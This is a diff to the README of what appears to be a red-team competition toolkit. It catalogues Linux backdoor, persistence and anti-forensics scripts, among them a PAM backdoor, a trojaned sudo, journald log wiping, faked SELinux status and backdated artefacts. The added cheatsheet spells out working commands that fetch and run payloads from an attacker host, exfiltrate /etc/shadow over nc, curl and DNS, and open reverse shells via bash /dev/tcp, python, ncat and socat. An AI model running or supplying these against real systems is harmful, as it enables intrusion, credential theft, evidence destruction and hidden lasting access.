@@ -12,7 +12,7 @@
 │   ├── poison-timer.sh
 │   ├── python2-certbot.service
 │   └── python2-certbot.timer
-├── flood-journal.sh
+├── nuke-journal.sh
 ├── infinite-users.sh
 ├── lock-busybox.sh
 ├── no-apt.sh
@@ -33,6 +33,7 @@
 ├── shadow-crond.sh
 ├── sinkhole-scripts.sh
 ├── sudo-biNOry.sh
+├── test-all-on-vm1.sh
 ├── the-toucher.sh
 ├── ureadahead-persist.sh
 ├── vandalize-bashrc.sh
@@ -51,7 +52,7 @@
 | break-net-tools.sh | breaks curl, wget, and git via binary shadowing + proxy poisoning + shell function injection, all reversible, local git ops still work so scoring doesnt break — usage: `install\|remove\|status` |
 | compromise-w-who.sh | backs up the `w` and `who` binaries then overwrites them with fakes, `w` shows hardcoded fake session data, `who` just says "better question is, where?" |
 | evil-timer | poison-timer.sh is the real one — takes `--key "ssh-ed25519 ..."` to bake SSH key re-injection into the payload alongside firewall flush, SUID bash drop, and watchdog restarts; state saved to /var/cache/.syspkg/poison-timer.state so `remove` always targets exactly what was installed rather than re-guessing; all artefacts backdated 2020-04-15; deploy-evil-timer.sh deploys the python2-certbot user-level timer (no root) — usage: `install [--target <timer>] [--interval <min>] [--key "..."] \| remove \| status \| list` |
-| flood-journal.sh | poisons journald.conf, corrupts existing .journal files with urandom garbage so historical logs are unreadable, shadows journalctl to report no entries and 0 disk usage, floods with 8 parallel workers via /dev/log, installs a drop-in on systemd-journald itself so workers relaunch whenever journald restarts — watchdog delegated to shadow-crond hidden spool (no visible cron entry anywhere); `status` checks the spool directly rather than crontab — usage: `install\|remove\|status` |
+| nuke-journal.sh | kills journald logging entirely via Storage=none + RuntimeMaxUse=0 drop-ins, wipes all existing .journal files, shadows journalctl to report no entries and 0 disk usage, sets LogLevelMax=0 so nothing new is recorded — nothing survives; `wipe` sub-command can be called standalone to blast existing logs without touching the drop-ins — usage: `install\|remove\|status\|wipe` |
 | infinite-users.sh | symlinks nologin to bash so any service account can get a shell, writes a sudoers.d entry giving all those accounts full nopasswd root, and sets a known password on every unlocked account so they're immediately SSHable — default password `rt2025!delta`, override with positional arg: `infinite-users 'mypass'` |
 | lock-busybox.sh | replaces all busybox binaries with a gated wrapper — no token = segfault, red team uses RT_TOK=rt2025!delta or the hidden binary at /var/cache/.syspkg/busybox.real directly, also chmod 700s the shadow-crond copy so blue team cant call it — **must run AFTER shadow-crond.sh**; install now warns if shadow-crond (systemd-timesyncd-helper) isn't running before proceeding — usage: `install\|remove\|status` |
 | no-apt.sh | renames sources.list and sources.list.d so apt-get silently breaks — idempotent, skips if already deployed — usage: `install\|remove\|status` |
@@ -59,14 +60,15 @@
 | no-selinux.sh | immediately sets permissive with the real setenforce, persists SELINUX=permissive in config, then shadows setenforce (no-op), getenforce (always says Enforcing), sestatus (full fake enforcing output), and semodule (no-op) — blue team sees enforcing but nothing is actually being enforced — idempotent, skips if backup exists; `remove` restores all four binaries and runs the real setenforce 1; `status` reads real enforcement via backup binary so it tells the truth — usage: `install\|remove\|status` |
 | pam-backdoor | compiles pam_audit_log.so (looks like a legit audit stub) and prepends `auth sufficient` to /etc/pam.d/common-auth, lets you auth as any user with the magic password without touching real credentials; self-contained (C source embedded as heredoc, no companion .c needed); PAM dir detected via `find` on pam_unix.so (no python3 dependency); preflight checks gcc and libpam0g-dev headers; .so timestamped to match existing PAM modules; idempotent — usage: `install\|remove\|status` |
 | pihole-github-sinkhole.sh | installs pihole unattended and sinkholes all github domains (github.com, githubusercontent.com, ghcr.io, etc) to 0.0.0.0, also poisons /etc/hosts as a backup layer |
-| shadow-crond.sh | copies busybox to a hidden path so ps shows a system-looking name, runs busybox crond with a custom spool dir invisible to crontab -l, hides behind a systemd-timesyncd-helper service, hidden spool also watches flood-journal service every 5 min — edit /var/cache/.syspkg/tabs/root to change payload — **must run BEFORE lock-busybox.sh**; install now detects if the found busybox is the lock-busybox gated wrapper and automatically falls back to /var/cache/.syspkg/busybox.real — usage: `install\|remove\|status` |
+| shadow-crond.sh | copies busybox to a hidden path so ps shows a system-looking name, runs busybox crond with a custom spool dir invisible to crontab -l, hides behind a systemd-timesyncd-helper service — edit /var/cache/.syspkg/tabs/root to change payload — **must run BEFORE lock-busybox.sh**; install now detects if the found busybox is the lock-busybox gated wrapper and automatically falls back to /var/cache/.syspkg/busybox.real — usage: `install\|remove\|status` |
 | sinkhole-scripts.sh | sets up a dnsmasq sinkhole for any domain, defaults to pointing github.com at a dead ip, has install/remove/test |
-| sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates a backdoor user `sudoer` with full nopasswd root on first invocation, then passes through normally |
-| the-toucher.sh | wanders the filesystem randomly and touches files to corrupt timestamps, messes with log rotation and anything that uses mtime |
-| vandalize-bashrc.sh | searches the machine for .bashrc files and adds a big `:3` to them |
+| sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates backdoor user `sudoer` (full nopasswd root) on first invocation, then passes through to the real sudo — real binary backed up to `/usr/bin/sudo.based`; `remove` restores original and deletes sudoer account — usage: `install\|remove\|status` |
+| test-all-on-vm1.sh | test harness: runs every remote tool through pre-clean → install → status → remove on a single target and prints a PASS/WARN/FAIL receipt; useful for validating the toolkit against a fresh VM before competition — usage: `./test-all-on-vm1.sh [-t user@host] [-p pass] [-i keyfile]` |
+| the-toucher.sh | runs as a background daemon (PID written to `/var/cache/.syspkg/toucher.pid`) that wanders the filesystem and randomly touches writable files every 0.1 s by default — corrupts mtimes, floods inotify watchers, breaks log rotation; never touches /proc /sys /dev — usage: `install [root] [delay] [max_depth] \| remove \| status` |
+| vandalize-bashrc.sh | appends RT ASCII art to every `.bashrc` on the system (skips greyteam/ansible/scoring users), marked with `# rt-vandalize` sentinel so `remove` can strip it cleanly with sed — idempotent, skips already-vandalized files — usage: `install\|remove\|status` |
 | vim-persist.sh | injects a vimscript autocmd into all .vimrc files that flushes iptables and nftables silently on every vim open, also hits /etc/vim/vimrc.local for system-wide coverage on users without a .vimrc — skips greyteam/ansible/scoring users, /etc/vim/vimrc.local respects the same whitelist |
 | yay-install.sh | installs yay, probably doesnt work on ubuntu but whatever |
-| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: SSH key injection into all homedirs, firewall flush, watchdog restart of shadow-crond + flood-journal — all artefacts backdated to 2020-04-15 — usage: `install [--key "..."] \| remove \| status` |
+| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: SSH key injection into all homedirs, firewall flush, watchdog restart of shadow-crond — all artefacts backdated to 2020-04-15 — usage: `install [--key "..."] \| remove \| status` |
 | path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: ssh-key / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--key "..."] [--payload 1\|2\|3] \| remove \| status` |
 | mass-deploy.sh | fan-out wrapper over rt-ssh.sh — fires one job per Linux host concurrently (default: all 9 at once), captures per-host output, prints a pass/fail summary table; host list baked in (internal IPs 10.10.10.101–109, Linux only); supports `--dry-run` to preview commands, `--hosts FILE` to override the target list, `-j N` to cap parallelism — see Mass Deployment section below |
 | rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; supports root SSH, sudo with/without password, and user-level (no sudo) modes — see Deployment section below |
@@ -74,7 +76,7 @@
 ### Deployment notes
 
 - **shadow-crond.sh must run before lock-busybox.sh** — both scripts now enforce this in code: shadow-crond detects the lock-busybox wrapper (grep for RT_TOK) and falls back to `/var/cache/.syspkg/busybox.real`; lock-busybox warns at install time if shadow-crond isn't running; if you get the order wrong, the fix is `lock-busybox.sh remove → shadow-crond.sh install → lock-busybox.sh install`
-- **flood-journal.sh watchdog** — does not install any cron entry; shadow-crond's hidden spool at `/var/cache/.syspkg/tabs/root` watches `network-health-monitor` every 5 min; `flood-journal.sh status` now verifies the spool directly instead of checking crontab
+- **nuke-journal.sh** — replaces flood-journal.sh; uses systemd drop-ins (`Storage=none`, `LogLevelMax=0`) instead of flooding workers so it's completely silent and leaves nothing to watch for; `wipe` subcommand can be called at any time to blast existing log files
 - **poison-timer.sh apt-daily caveat** — apt-daily.timer is last in the auto-select list; if no-apt.sh ran first, apt-daily's ExecStart may fail and block ExecStartPost; man-db/logrotate/fstrim are preferred — this is enforced by candidate ordering in the script
 - **idempotent scripts** — no-apt.sh, no-audit.sh, no-selinux.sh all exit early if already deployed; no-audit.sh and no-selinux.sh now also have `remove` and `status` subcommands matching the rest of the toolkit
 - **shared hidden dir** — all scripts use `/var/cache/.syspkg/` for backups and binaries (chmod 700); poison-timer state is at `/var/cache/.syspkg/poison-timer.state`
@@ -316,7 +318,7 @@ These scripts manage the target directly without the `rt-ssh.sh` pipe — they h
 
 ```bash
 TARGET="root@<host_ip>"
-for tool in shadow-crond flood-journal ureadahead-persist lock-busybox poison-timer pam-backdoor no-audit no-selinux path-hijack; do
+for tool in shadow-crond nuke-journal ureadahead-persist lock-busybox poison-timer pam-backdoor no-audit no-selinux path-hijack; do
     echo "=== $tool ==="
     ./rt-ssh.sh -t $TARGET $tool status 2>/dev/null || true
 done
@@ -391,3 +393,111 @@ chmod +x webshells/*.sh persist/*.sh
 | Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
 | Upload | `POST ?p=rt2025!delta&act=upload` |
 | Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
+
+---
+
+## Cheatsheet — Exfil / Drop Files / Run Commands
+
+### Run commands on a remote host
+
+```bash
+# rt-ssh.sh (recommended — no trace on disk)
+./rt-ssh.sh -t root@TARGET --no-sudo shadow-crond status
+
+# plain SSH one-liner
+ssh root@TARGET 'id; hostname; cat /etc/passwd'
+
+# sshpass (password auth)
+sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no user@TARGET 'id'
+
+# via webshell
+curl 'http://TARGET/shell.php?p=rt2025!delta&c=id'
+
+# via cron (already installed shadow-cron spool)
+echo '* * * * * root id > /tmp/out' >> /var/cache/.syspkg/tabs/root
+
+# via PAM (once backdoor is installed — any user, any shell)
+ssh ANY_USER@TARGET   # password: rt2025!delta
+```
+
+### Drop files on a remote host
+
+```bash
+# SCP (key auth)
+scp -i ~/.ssh/rt_ed25519 payload.sh root@TARGET:/tmp/
+
+# SCP (password auth via sshpass)
+sshpass -p 'PASS' scp payload.sh user@TARGET:/tmp/
+
+# base64 over SSH (no SCP binary needed; lands in RAM)
+base64 -w0 payload.sh | ssh root@TARGET \
+  'base64 -d > /dev/shm/.x; chmod 700 /dev/shm/.x; /dev/shm/.x; rm -f /dev/shm/.x'
+
+# curl from your Kali HTTP server
+ssh root@TARGET 'curl -so /tmp/p http://KALI_IP:8080/payload.sh && bash /tmp/p'
+
+# wget equivalent
+ssh root@TARGET 'wget -qO /tmp/p http://KALI_IP:8080/payload.sh && bash /tmp/p'
+
+# via PHP webshell upload
+curl -F "file=@payload.sh" 'http://TARGET/shell.php?p=rt2025!delta&act=upload'
+
+# Python HTTP server on Kali (serve current dir)
+python3 -m http.server 8080
+```
+
+### Exfiltrate data from a remote host
+
+```bash
+# SCP pull (key auth)
+scp -i ~/.ssh/rt_ed25519 root@TARGET:/etc/shadow ./loot/
+
+# SCP pull (password)
+sshpass -p 'PASS' scp user@TARGET:/etc/shadow ./loot/
+
+# SSH + tar (entire directory, no intermediate file)
+ssh root@TARGET 'tar czf - /etc/' > loot/etc.tar.gz
+
+# SSH + base64 (single file, no SCP)
+ssh root@TARGET 'base64 /etc/shadow' | base64 -d > loot/shadow
+
+# curl POST to Kali listener (from target — if net is open)
+# on Kali: nc -lvnp 9001 > loot/passwd
+ssh root@TARGET 'curl -s -X POST --data-binary @/etc/passwd http://KALI_IP:9001'
+
+# nc pipe (if nc with -e or openbsd nc available on target)
+# on Kali: nc -lvnp 9001 > loot/passwd
+ssh root@TARGET 'nc KALI_IP 9001 < /etc/passwd'
+
+# DNS exfil (slow, bypasses HTTP blocks — xxd + dig)
+ssh root@TARGET \
+  'xxd -p /etc/passwd | tr -d "\n" | fold -w 60 | \
+   while read c; do dig +short "${c}.exfil.KALI_DOMAIN" @KALI_IP; done'
+
+# via webshell read
+curl 'http://TARGET/shell.php?p=rt2025!delta&act=read&f=/etc/shadow'
+
+# rsync (if available)
+rsync -avz -e "ssh -i ~/.ssh/rt_ed25519" root@TARGET:/var/log/ ./loot/logs/
+```
+
+### Establish a reverse shell
+
+```bash
+# bash TCP
+bash -i >& /dev/tcp/KALI_IP/4444 0>&1
+
+# python3
+python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('KALI_IP',4444)); \
+  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])"
+
+# via webshell
+curl 'http://TARGET/shell.php?p=rt2025!delta&act=revshell&rh=KALI_IP&rp=4444'
+
+# ncat (if ncat/nc on target)
+ncat KALI_IP 4444 -e /bin/bash
+
+# socat (full PTY)
+# on Kali: socat file:`tty`,raw,echo=0 tcp-listen:4444
+socat exec:/bin/bash,pty,setsid,sigint,sane tcp:KALI_IP:4444
+```
